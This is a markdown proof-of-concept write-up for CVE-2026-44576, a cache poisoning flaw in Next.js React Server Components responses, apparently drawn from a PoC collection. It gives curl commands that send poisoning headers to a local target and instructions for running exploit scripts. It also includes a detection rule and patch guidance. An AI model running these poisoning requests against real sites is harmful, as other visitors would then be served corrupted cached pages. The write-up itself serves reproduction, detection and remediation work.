# Next.js RSC Response Cache Poisoning (CVE-2026-44576)

<!-- 
  File: 2026-05-17_nextjs-rsc-response-cache-poisoning.md
  Location: pocs/<category>/
-->

---

## Metadata

| Field | Value |
|---|---|
| **Date Added** | 2026-05-17 |
| **Author / Researcher** | dwisiswant0 |
| **CVE / Advisory** | CVE-2026-44576 |
| **Category** | web |
| **Severity** | Medium |
| **CVSS Score** | 5.4 (CVSSv3) |
| **Status** | Weaponized |
| **Tags** | cache-poisoning, RSC, response-confusion, Next.js, shared-cache, unauthenticated |
| **Related** | N/A |

---

## Affected Target

| Field | Value |
|---|---|
| **Software / System** | Next.js App Router deployments using React Server Components (RSC) behind shared caches |
| **Versions Affected** | 14.2.0–15.5.15 and 16.0.0–16.2.4 (fixed in 15.5.16 / 16.2.5) |
| **Language / Platform** | JavaScript / Node.js |
| **Authentication Required** | No |
| **Network Access Required** | Yes |

---

## Summary

CVE-2026-44576 is a cache poisoning issue in Next.js RSC response handling. In vulnerable versions, RSC and HTML response variants can be mis-partitioned by shared caches when request/response variants are not keyed correctly, allowing attacker-controlled requests to poison a cache entry. Later visitors can receive an incorrect RSC payload variant for the same URL. The issue is rated Medium (CVSS 5.4), with no known active exploitation at disclosure time.

---

## Vulnerability Details

### Root Cause

The vulnerable request/response handling path allowed RSC-specific responses to be ambiguously classified for caching in some deployment/cache setups. If a shared cache did not vary on RSC-relevant headers and variant metadata, poisoned entries could be stored under keys later reused by normal browser traffic.

### Attack Vector

An attacker sends crafted requests to an affected Next.js route with RSC-related headers so an intermediary cache stores a mismatched response variant under a shared key. Subsequent legitimate users requesting the same path can receive the poisoned RSC payload.

### Impact

Successful exploitation can cause cross-user response confusion and content integrity issues, where users receive incorrect server component output for a route. In practical deployments this can break rendering behavior and leak/override expected page state served from shared cache.

---

## Environment / Lab Setup

```
OS:          Linux/macOS/Windows
Target:      Next.js 14.2.0–15.5.15 or 16.0.0–16.2.4 deployment
Attacker:    Any host able to send crafted HTTP requests
Tools:       python3, bash, curl
```

### Setup Steps

```bash
# Clone source PoC collection
git clone https://github.com/dwisiswant0/next-16.2.4-pocs.git
cd next-16.2.4-pocs/poc/CVE-2026-44576_GHSA-wfc6-r584-vfw7

# Run exploit against local mock or remote target
python3 exploit.py
# or
bash exploit.sh
```

---

## Proof of Concept

### Step-by-Step Reproduction

1. **Run baseline request** to observe normal response.
   ```bash
   curl -i 'http://127.0.0.1:8082/tenant-x/samples?nxtPtenant=tenant-x'
   ```

2. **Send poisoning request** with RSC-oriented headers.
   ```bash
   curl -i \
     -H 'RSC: text/x-component' \
     -H 'Next-Router-Prefetch: 1' \
     'http://127.0.0.1:8082/tenant-x/samples?nxtPtenant=tenant-x'
   ```

3. **Re-request without attacker headers** and compare response behavior/content type.
   ```bash
   python3 exploit.py http://127.0.0.1:8082/tenant-x/samples?nxtPtenant=tenant-x
   ```

### Exploit Code

> See `exploit.py` and `exploit.sh` in this folder.

```python
from exploit import main
import sys

sys.exit(main(["exploit.py", "http://127.0.0.1:8082/tenant-x/samples?nxtPtenant=tenant-x"]))
```

### Expected Output

```
[+] VULNERABLE -- cache poisoned: RSC binary served as text/html.
```

---

## Screenshots / Evidence

- `screenshots/` — add response header/body captures showing mismatched variant/content-type behavior

---

## Detection & Indicators of Compromise

```
# Monitor for repeated requests to the same URL with and without RSC headers,
# especially where cached responses flip expected content-type/variant:
RSC: text/x-component
Next-Router-Prefetch: 1
```

**SIEM / IDS Rule (example):**
```
alert http any any -> $HTTP_SERVERS any (
  msg:"Possible Next.js RSC response cache poisoning attempt";
  content:"RSC|3a|"; http_header;
  content:"Next-Router-Prefetch|3a|"; http_header;
  sid:900044576; rev:1;
)
```

---

## Remediation

| Action | Detail |
|---|---|
| **Patch** | Upgrade Next.js to 15.5.16 or 16.2.5+ |
| **Workaround** | Ensure shared caches/CDNs vary on RSC and router-prefetch variant headers; avoid sharing incompatible variants under a single key |
| **Config Hardening** | Audit cache key partitioning for RSC/HTML variants and monitor anomalous variant mismatches |

---

## References

- [CVE-2026-44576 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-44576)
- [Next.js Advisory — GHSA-wfc6-r584-vfw7](https://github.com/vercel/next.js/security/advisories/GHSA-wfc6-r584-vfw7)
- [Next.js Patch Commit af0e96ba23](https://github.com/vercel/next.js/commit/af0e96ba231efe9f647cb5cd6f01d7c8abd25b3a)
- [Next.js Patch Commit 0dd94836a8](https://github.com/vercel/next.js/commit/0dd94836a8b43209fcfefa448c141683c22c1a27)
- [Source Repository — dwisiswant0/next-16.2.4-pocs](https://github.com/dwisiswant0/next-16.2.4-pocs)

---

## Notes

Auto-ingested from https://github.com/dwisiswant0/next-16.2.4-pocs on 2026-05-17.

Issue notes indicate no known active exploitation at time of reporting.
